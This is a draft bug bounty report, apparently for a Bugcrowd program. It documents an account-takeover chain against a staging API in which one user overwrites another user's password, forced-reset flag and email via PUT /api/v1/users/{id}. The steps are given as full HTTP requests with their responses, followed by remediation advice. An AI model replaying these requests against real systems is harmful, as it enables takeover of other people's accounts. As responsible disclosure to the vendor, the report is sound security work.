# BUG-008 — SUBMISSION DRAFT (Bugcrowd, ready to paste)

**Title:** Full Account Takeover of any organization user via cross-account write on `PUT /api/v1/users/{id}`: password mass-assignment without current-password verification + forced-reset flag tampering

**Target:** https://bugbounty1.qe.optrostaging.ai

**Requested severity:** P1 (Account Takeover)

**Steps To Reproduce:**

All requests use the program-provided two-account setup (attacker = user 230 golden-leaf-3068@, victim = user 231 golden-snow-4771@, both role "Owner"). Replace `token: 230:<ATTACKER_TOKEN>` with the attacker's own API token header.

**1. Attacker reads the victim's record (no authorization check):**
```
GET /api/v1/users/231 HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: 230:<ATTACKER_TOKEN>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Accept: application/json
```
→ `200` full victim record (email, role, MFA state, lockout counters).

**2. Attacker rotates the victim's password without knowing the current one (BOLA + password mass-assignment):**
```
PUT /api/v1/users/231 HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: 230:<ATTACKER_TOKEN>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Content-Type: application/json

{"user":{"password":"ZzZtmpPw2!"}}
```
→ `200`. Server-side proof the password really changed:
- Login as victim with `ZzZtmpPw2!` → `401 {"error":"login_failed_password_change_required"}` (password ACCEPTED; forced-reset flag intercepts).
- Login as victim with a wrong password → `401 {"error":"login_failed","message":"No user found for that email and password combination"}`.
- Victim's previous API token immediately returns `401` on all endpoints; victim record flips `requires_password_change:true`.

**3. Attacker clears the forced-reset flag on the victim:**
```
PUT /api/v1/users/231 HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: 230:<ATTACKER_TOKEN>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Content-Type: application/json

{"user":{"requires_password_change":false}}
```
→ `200`, flag now `false`.

**4. Attacker logs in as the victim and receives a fresh API token for the victim account:**
```
POST /api/v1/users/login HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
Content-Type: application/json

{"credentials":{"email":"golden-snow-4771@bugcrowdninja.com","password":"ZzZtmpPw2!"}}
```
→ `200` `{"session":{"id":231,...,"token":"231:<fresh-victim-api-token>","expires":...}}` — the `session.token` value was verified working (`GET /api/v1/users/231` with it → `200`). Full takeover achieved.

**Secondary primitive (also confirmed):** the same endpoint overwrites the victim's **email** (`{"user":{"email":"attacker-controlled@..."}}` → `200`, persisted) — a standalone ATO path via password-reset delivery hijack.

**Additional cross-account access:** attacker's token reads victim's uploaded file records (`GET /api/v1/files/{victim_file_id}` → `200`).

**Impact:**

- Any authenticated user (plain "Owner" role, no admin privileges) can take over **every other account in the organization**. The org roster is enumerable (`GET /api/v1/users/query` — 316 users in this environment), including **Superuser (role_id 1)** accounts; the same three requests against a Superuser id yield full organization compromise (site configuration, all audit data, token minting for admins).
- Attacker ends with: attacker-chosen victim password, a **fresh working API token for the victim**, victim email control (password-reset delivery hijack), and the victim's own token silently invalidated (real user locked out — persistence).
- No MFA challenge was issued at any point in the chain.
- Only difference between horizontal and vertical compromise is the target user id — no other step changes.

**Notes on tested-but-not-possible paths (for triage completeness):** `role_id` is NOT mass-assignable through this endpoint (`{"user":{"role_id":1}}` → `422`), so self-escalation via role field is blocked — however role escalation is unnecessary because Superuser accounts can be taken over directly with the same chain.

**Remediation suggestions:** object-level authorization on user update (self or admin only); remove `password` / `requires_password_change` from mass-assignment; dedicated password-change endpoint requiring `current_password`; verified-email flow for email changes.
